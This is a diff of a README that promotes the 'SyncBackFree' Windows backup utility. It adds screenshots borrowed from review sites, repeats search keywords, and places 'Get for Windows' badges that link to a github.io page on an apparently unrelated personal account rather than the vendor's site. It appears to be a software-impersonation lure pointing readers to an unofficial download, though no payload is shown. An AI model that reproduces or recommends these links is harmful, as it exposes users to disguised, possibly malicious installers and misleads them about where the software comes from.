@@ -1,6 +1,6 @@
 # SyncBackFree Backup Utility for Windows
 
-<img src="" alt="SyncBackFree Logo" width="560">
+<img src="https://www.dedoimedo.com/images/computers-years/2018-2/syncback-simulation-summary.png" alt="SyncBackFree Logo" width="660">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/SyncBackFree-Backup-Utility)
 
@@ -18,7 +18,7 @@ Many users also explore **bright sparks syncback** and **syncback deutsch** when
 
 Designed specifically for Windows, SyncBackFree combines folder synchronization, scheduled backups, cloud integration, file comparison, and backup automation into a lightweight desktop application suitable for home users, professionals, and IT administrators.
 
-<img src="" width="900">
+<img src="https://www.wintips.org/wp-content/uploads/2014/02/yb3xyypi.jpg" width="900">
 
 [![Hi](https://img.shields.io/badge/Get%20for-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://camilorobersonopcr.github.io/.github/SyncBackFree-Backup-Utility)
 
